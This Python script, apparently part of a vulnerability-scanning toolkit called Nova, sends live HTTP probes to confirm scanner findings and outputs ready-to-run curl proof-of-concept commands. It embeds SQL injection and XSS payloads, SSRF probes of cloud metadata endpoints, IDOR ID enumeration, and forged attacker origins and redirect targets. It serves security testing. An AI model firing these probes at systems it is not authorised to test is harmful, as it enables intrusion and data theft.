#!/usr/bin/env python3
"""
NOVA POC VERIFIER v1.0
======================
Proof-of-Concept verification engine.
For each CRITICAL/HIGH Nova finding, sends a real HTTP request to confirm
the vulnerability is genuine and generates a reproducible curl PoC command.

Called automatically after nova_ci_runner.py completes.
Output: nova_poc_report.json
"""
import json, os, sys, time, urllib.parse, concurrent.futures
from datetime import datetime
from typing import Dict, List, Optional, Tuple

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("  ⚠️  requests not installed — PoC verifier skipped")
    sys.exit(0)

WORKSPACE     = os.environ.get("NOVA_WORKSPACE", os.path.expanduser("~/nova_workspace"))
TARGET        = os.environ.get("NOVA_TARGET", "")
TIMEOUT       = 10
MAX_WORKERS   = 8

SESSION = requests.Session()
SESSION.verify = False
SESSION.headers.update({
    "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64) Nova-Arsenal/2.0",
    "Accept":          "application/json, text/html, */*",
    "Accept-Language": "en-US,en;q=0.9",
})


# ─── VERIFIER FUNCTIONS PER VULN TYPE ────────────────────────────────────────

def verify_csrf(finding: Dict) -> Tuple[bool, str, str]:
    """Confirm CSRF by sending cross-origin request without CSRF token."""
    url    = finding.get("url", TARGET)
    method = finding.get("method", "POST").upper()
    evil_origins = ["https://evil-attacker.com", "null", "https://attacker.example"]
    for origin in evil_origins:
        try:
            hdrs = {"Origin": origin, "Referer": origin + "/evil", "Content-Type": "application/json"}
            r = SESSION.request(method, url, json={}, headers=hdrs, timeout=TIMEOUT, allow_redirects=False)
            cors = r.headers.get("Access-Control-Allow-Origin", "")
            if r.status_code not in (403, 401, 422) and cors in ("*", origin):
                curl = (f'curl -sk -X {method} "{url}" '
                        f'-H "Origin: {origin}" -H "Content-Type: application/json" -d "{{}}"')
                return True, f"CORS:{cors} Status:{r.status_code}", curl
        except Exception:
            pass
    return False, "", ""


def verify_sqli(finding: Dict) -> Tuple[bool, str, str]:
    """Confirm SQL injection by sending a tautology payload and checking for DB error or bypass."""
    url = finding.get("url", TARGET)
    payloads = ["' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(3)--", "1 UNION SELECT NULL--"]
    errors   = ["sql syntax","mysql_fetch","pg_query","sqlite3","ORA-","you have an error in your sql",
                "unclosed quotation","unterminated string","microsoft ole db","jdbc","syntax error"]
    for p in payloads:
        try:
            test_url = url + ("&" if "?" in url else "?") + f"id={urllib.parse.quote(p)}"
            r = SESSION.get(test_url, timeout=TIMEOUT, allow_redirects=False)
            body = r.text.lower()
            matched = [e for e in errors if e in body]
            if matched or r.elapsed.total_seconds() > 2.5:
                curl = f'curl -sk "{test_url}"'
                return True, f"DB error: {matched[0] if matched else 'SLEEP triggered'}", curl
        except Exception:
            pass
    return False, "", ""


def verify_xss(finding: Dict) -> Tuple[bool, str, str]:
    """Confirm XSS by checking if payload reflects unescaped in response."""
    url     = finding.get("url", TARGET)
    marker  = "novaxss9127"
    payload = f"<script>alert('{marker}')</script>"
    params  = ["q", "search", "input", "name", "query", "s", "term", "text", "keyword"]
    for p in params:
        try:
            r = SESSION.get(url, params={p: payload}, timeout=TIMEOUT)
            if payload in r.text or marker in r.text:
                test_url = url + f"?{p}=" + urllib.parse.quote(payload)
                curl = f'curl -sk "{test_url}"'
                return True, f"Reflected in body via param={p}", curl
        except Exception:
            pass
    return False, "", ""


def verify_idor(finding: Dict) -> Tuple[bool, str, str]:
    """Confirm IDOR by accessing object IDs 1,2,3 without proper auth."""
    url = finding.get("url", TARGET)
    ids = [1, 2, 3, 99, 1000, 999999]
    base = url.rstrip("/")
    for oid in ids:
        try:
            test_url = f"{base}/{oid}"
            r = SESSION.get(test_url, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 50:
                curl = f'curl -sk "{test_url}"'
                return True, f"HTTP 200 on /{oid}, body len={len(r.text)}", curl
        except Exception:
            pass
    return False, "", ""


def verify_open_redirect(finding: Dict) -> Tuple[bool, str, str]:
    """Confirm open redirect by checking if attacker URL is accepted."""
    url     = finding.get("url", TARGET)
    evil    = "https://evil-attacker.com"
    params  = ["redirect", "next", "url", "return", "returnUrl", "goto", "dest", "destination", "redir", "target"]
    for p in params:
        try:
            r = SESSION.get(url, params={p: evil}, timeout=TIMEOUT, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if evil in loc or "evil-attacker.com" in loc:
                test_url = url + f"?{p}=" + urllib.parse.quote(evil)
                curl = f'curl -skI "{test_url}"'
                return True, f"Location: {loc}", curl
        except Exception:
            pass
    return False, "", ""


def verify_ssrf(finding: Dict) -> Tuple[bool, str, str]:
    """Probe SSRF by injecting cloud IMDS URLs and checking response."""
    url    = finding.get("url", TARGET)
    probes = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "http://localhost/",
        "http://127.0.0.1/",
    ]
    params = ["url", "uri", "src", "source", "path", "dest", "destination", "host", "endpoint", "proxy"]
    for p in params:
        for probe in probes[:2]:
            try:
                r = SESSION.get(url, params={p: probe}, timeout=TIMEOUT, allow_redirects=False)
                body = r.text.lower()
                if any(kw in body for kw in ("ami-id","instance-id","availability-zone","metadata","computemetadata")):
                    test_url = url + f"?{p}=" + urllib.parse.quote(probe)
                    curl = f'curl -sk "{test_url}"'
                    return True, f"IMDS data returned via param={p}", curl
            except Exception:
                pass
    return False, "", ""


def verify_info_disclosure(finding: Dict) -> Tuple[bool, str, str]:
    """Confirm info disclosure by checking if sensitive headers/paths are exposed."""
    url  = finding.get("url", TARGET)
    try:
        r    = SESSION.get(url, timeout=TIMEOUT)
        body = r.text
        hits = []
        patterns = {
            "private_key":   "-----BEGIN",
            "aws_key":       "AKIA",
            "debug_info":    "stack trace",
            "version_leak":  "X-Powered-By",
            "server_leak":   "Server:",
        }
        for name, kw in patterns.items():
            if kw in body or kw in str(r.headers):
                hits.append(name)
        if hits:
            curl = f'curl -skI "{url}"'
            return True, f"Sensitive info: {', '.join(hits)}", curl
    except Exception:
        pass
    return False, "", ""


def verify_headers(finding: Dict) -> Tuple[bool, str, str]:
    """Confirm missing security headers."""
    url = finding.get("url", TARGET)
    try:
        r = SESSION.get(url, timeout=TIMEOUT)
        missing = []
        required = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy":   "CSP",
            "X-Frame-Options":           "Clickjacking protection",
            "X-Content-Type-Options":    "MIME sniffing protection",
        }
        for hdr, name in required.items():
            if hdr not in r.headers:
                missing.append(name)
        if len(missing) >= 2:
            curl = f'curl -skI "{url}"'
            return True, f"Missing: {', '.join(missing)}", curl
    except Exception:
        pass
    return False, "", ""


VERIFIERS = {
    "csrf":             verify_csrf,
    "xss":              verify_xss,
    "sqli":             verify_sqli,
    "sql":              verify_sqli,
    "sql injection":    verify_sqli,
    "idor":             verify_idor,
    "open redirect":    verify_open_redirect,
    "redirect":         verify_open_redirect,
    "ssrf":             verify_ssrf,
    "information":      verify_info_disclosure,
    "secret":           verify_info_disclosure,
    "exposure":         verify_info_disclosure,
    "header":           verify_headers,
}


def pick_verifier(finding: Dict):
    vuln_type = str(finding.get("type", finding.get("description", ""))).lower()
    for key, fn in VERIFIERS.items():
        if key in vuln_type:
            return fn
    return None


def verify_finding(finding: Dict) -> Dict:
    fn = pick_verifier(finding)
    if not fn:
        return {**finding, "poc_status": "NO_VERIFIER", "poc_confirmed": False}
    try:
        confirmed, evidence, curl_cmd = fn(finding)
        return {
            **finding,
            "poc_status":    "CONFIRMED" if confirmed else "UNCONFIRMED",
            "poc_confirmed": confirmed,
            "poc_evidence":  evidence,
            "poc_curl":      curl_cmd,
            "poc_timestamp": datetime.utcnow().isoformat(),
        }
    except Exception as ex:
        return {**finding, "poc_status": "ERROR", "poc_confirmed": False, "poc_error": str(ex)}


# ─── MAIN ────────────────────────────────────────────────────────────────────

def run_poc_verification(findings_file: str = None) -> Dict:
    print("\n" + "═"*68)
    print("  🧪 NOVA POC VERIFIER — Live Proof-of-Concept Confirmation")
    print("═"*68)

    # Load findings
    if not findings_file:
        candidates = sorted([
            f for f in os.listdir(WORKSPACE)
            if f.startswith("nova_ci_all_findings_") and f.endswith(".json")
        ])
        if not candidates:
            print("  ⚠️  No findings file found in workspace — skipping PoC")
            return {}
        findings_file = os.path.join(WORKSPACE, candidates[-1])

    with open(findings_file) as fh:
        all_findings = json.load(fh)

    # Filter to CRITICAL/HIGH only
    critical_high = [
        f for f in all_findings
        if str(f.get("severity", "")).upper() in ("CRITICAL", "HIGH")
    ]

    # Fill in target URL if missing
    for f in critical_high:
        if not f.get("url") and not f.get("endpoint"):
            f["url"] = TARGET or f.get("target", "")

    print(f"  📋 {len(all_findings)} total findings → {len(critical_high)} CRITICAL/HIGH for PoC")

    confirmed_pocs = []
    unconfirmed    = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = {ex.submit(verify_finding, f): f for f in critical_high}
        for fut in concurrent.futures.as_completed(futs):
            result = fut.result()
            if result.get("poc_confirmed"):
                confirmed_pocs.append(result)
                sev  = result.get("severity", "HIGH")
                icon = "🚨" if sev == "CRITICAL" else "🔴"
                vtype = str(result.get("type", result.get("description", "??")))[:50]
                print(f"  {icon} CONFIRMED PoC: [{sev}] {vtype}")
                print(f"       Evidence : {result.get('poc_evidence','')}")
                print(f"       Curl PoC  : {result.get('poc_curl','')}")
            else:
                unconfirmed.append(result)

    report = {
        "generated":         datetime.utcnow().isoformat(),
        "target":            TARGET,
        "findings_assessed": len(critical_high),
        "confirmed_pocs":    len(confirmed_pocs),
        "unconfirmed":       len(unconfirmed),
        "confirmation_rate": round(len(confirmed_pocs) / max(len(critical_high), 1) * 100, 1),
        "pocs":              confirmed_pocs,
        "unconfirmed_list":  unconfirmed,
    }

    out = os.path.join(WORKSPACE, "nova_poc_report.json")
    with open(out, "w") as fh:
        json.dump(report, fh, indent=2)

    print("\n" + "═"*68)
    print(f"  ✅ PoC COMPLETE: {len(confirmed_pocs)}/{len(critical_high)} confirmed ({report['confirmation_rate']}%)")
    print(f"  💾 Report → {out}")
    print("═"*68)

    # Print curl PoC summary
    if confirmed_pocs:
        print("\n  📋 CURL POC COMMANDS (copy-paste ready):")
        for poc in confirmed_pocs:
            print(f"  # [{poc.get('severity')}] {poc.get('type', poc.get('description',''))[:60]}")
            print(f"  {poc.get('poc_curl','')}\n")

    return report


if __name__ == "__main__":
    f = sys.argv[1] if len(sys.argv) > 1 else None
    run_poc_verification(f)
